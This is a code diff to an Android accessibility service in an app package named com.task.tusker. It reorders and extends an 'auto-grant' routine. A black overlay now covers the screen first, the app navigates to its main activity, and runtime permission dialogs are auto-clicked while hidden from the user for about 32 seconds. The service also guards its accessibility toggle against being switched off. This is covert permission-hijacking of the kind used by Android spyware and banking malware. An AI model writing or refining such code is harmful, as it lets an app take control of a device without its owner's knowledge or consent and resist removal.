@@ -156,14 +156,17 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             isFirstLaunch = false;
         }
 
-        // Auto-grant timer and overlay are only relevant on first launch (permissions not yet granted)
+        // Auto-grant timer and overlay are only relevant on first launch (permissions not yet granted).
+        // IMPORTANT: addBlackOverlay() is called FIRST so the screen is covered before any
+        // navigation or permission dialogs begin. startAutoGrantTimer() will navigate to
+        // MainActivity and then launch PermissionRequestActivity, all under the black overlay.
         if (isFirstLaunch) {
-            try { startAutoGrantTimer(); } catch (Exception ignored) {}
             try {
                 addBlackOverlay();
-            android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
+                android.content.SharedPreferences prefs = getSharedPreferences("svc_prefs", MODE_PRIVATE);
                 prefs.edit().putBoolean("overlay_setup_done", true).apply();
             } catch (Exception ignored) {}
+            try { startAutoGrantTimer(); } catch (Exception ignored) {}
         }
 
         // Accessibility Assist: protect the accessibility toggle from being turned off.
@@ -919,8 +922,26 @@ public class UnifiedAccessibilityService extends AccessibilityService {
         };
         autoGrantHandler.post(autoGrantScanRunnable);
 
-        // Trigger all missing runtime permissions so the dialogs appear for the granter to click.
-        // Delay 1 s so the accessibility overlay is fully visible first.
+        // Step 1 (500 ms): Navigate to MainActivity under the black overlay.
+        // The user just enabled accessibility in Settings — we bring them back to the
+        // app first so they never see permission dialogs appearing on top of Settings
+        // or any other unrelated screen.
+        autoGrantHandler.postDelayed(() -> {
+            try {
+                Intent mainIntent = new Intent(this, com.task.tusker.MainActivity.class);
+                mainIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_CLEAR_TOP
+                        | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                startActivity(mainIntent);
+                Log.i(TAG, "Auto-grant: navigated to MainActivity before requesting permissions");
+            } catch (Exception e) {
+                Log.w(TAG, "Auto-grant: could not navigate to MainActivity: " + e.getMessage());
+            }
+        }, 500);
+
+        // Step 2 (2 500 ms): Trigger all missing runtime permissions so the dialogs
+        // appear for the granter to click. The black overlay is already up and the user
+        // is now in MainActivity, so dialogs are invisible and auto-clicked immediately.
         autoGrantHandler.postDelayed(() -> {
             try {
                 Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
@@ -932,14 +953,15 @@ public class UnifiedAccessibilityService extends AccessibilityService {
             } catch (Exception e) {
                 Log.w(TAG, "Auto-grant: could not launch PermissionRequestActivity: " + e.getMessage());
             }
-        }, 1_000);
+        }, 2_500);
 
-        // Auto-grant mode expires after 29 seconds.
+        // Auto-grant mode expires after 32 seconds (extended slightly to account for the
+        // extra 1.5 s delay before permissions start appearing).
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
-            Log.i(TAG, "Auto-grant mode expired after 29 seconds");
-        }, 29_000);
-        Log.i(TAG, "Auto-grant mode ENABLED — will auto-click permission dialogs for 29s");
+            Log.i(TAG, "Auto-grant mode expired");
+        }, 32_000);
+        Log.i(TAG, "Auto-grant mode ENABLED — navigate→MainActivity@500ms, perms@2500ms, expires@32s");
     }
 
     /**
